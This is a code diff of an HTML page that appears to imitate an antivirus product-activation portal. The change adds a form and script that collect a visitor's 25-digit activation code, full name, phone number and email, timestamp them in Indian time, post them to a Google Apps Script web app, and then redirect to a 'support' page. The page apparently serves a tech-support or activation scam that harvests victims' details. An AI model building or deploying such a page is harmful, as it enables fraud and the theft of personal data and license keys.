@@ -89,23 +89,55 @@ s0.parentNode.insertBefore(s1,s0);
             <a href="#" class="enter-code">ENTER YOUR CODE</a>
             <a href="#" class="create-acc">CREATE ACCOUNT</a>
             <a href="#" class="protected">GET PROTECTED</a>
-            <form method="post"  action="email1.php">
-                <h3>Enter your 25-digit activation code</h3>
-                <input type="text"  name="user_key" class="input-key" placeholder="xxxxx-xxxxx-xxxxx-xxxxx-xxxxx" required>
-				<h3>Enter your Name</h3>
-                <input type="text"  name="user_name" class="input-key" placeholder="Full Name" required>
-                <br>
-				<h3>Enter your Phone</h3>
-                <input type="text" pattern= "[0-9]+"  name="user_phone" class="input-key" placeholder="xxx-xxx-xxxx" required>
-                <br>
-				<h3>Enter your Email</h3>
-                <input type="text"  name="user_email" class="input-key" placeholder="" required>
-                <br><p>
-				
-				<p><button type="submit" onclick="sendpost()">Submit</button><p>
-               <a  class="where-is-code" >You will find activation code on the card</a> <br>
-                
-            </form>
+            <form id="gform">
+    <h3>Enter your 25-digit activation code</h3>
+    <input type="text" name="user_key" class="input-key" placeholder="xxxxx-xxxxx-xxxxx-xxxxx-xxxxx" required>
+    
+    <h3>Enter your Name</h3>
+    <input type="text" name="user_name" class="input-key" placeholder="Full Name" required>
+    <br>
+
+    <h3>Enter your Phone</h3>
+    <input type="text" pattern="[0-9]+" name="user_phone" class="input-key" placeholder="xxx-xxx-xxxx" required>
+    <br>
+
+    <h3>Enter your Email</h3>
+    <input type="text" name="user_email" class="input-key" placeholder="" required>
+    <br><p>
+
+    <p><button type="submit">Submit</button></p>
+    <a class="where-is-code">You will find activation code on the card</a> <br>
+</form>
+
+<script>
+  // 👉 Replace with your Google Apps Script Web App URL
+  const scriptURL = "https://script.google.com/macros/s/AKfycbwGsPri9KJfxmDcG-Zv9RwH7yk0IjbfJHUz0U1N_jWoaMwo3GH5c3e25T5MqsuTsPeaYg/exec";
+
+  document.getElementById("gform").addEventListener("submit", e => {
+    e.preventDefault();
+
+    // Get form data
+    let formData = Object.fromEntries(new FormData(e.target));
+
+    // Add IST Date & Time
+    let now = new Date();
+    let istTime = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Kolkata" }));
+    formData.datetime = istTime.toLocaleString("en-IN");
+
+    fetch(scriptURL, {
+      method: "POST",
+      body: JSON.stringify(formData),
+      headers: { "Content-Type": "application/json" }
+    })
+    .then(res => res.json())
+    .then(data => {
+      alert("✅ Submitted successfully!");
+      window.location.href = "mca-support.html"; // Redirect after submit
+    })
+    .catch(err => alert("❌ Error: " + err));
+  });
+</script>
+
             <div class="image-key-hint none-img">
                 <img src="img/key.png" alt="" >
             </div>
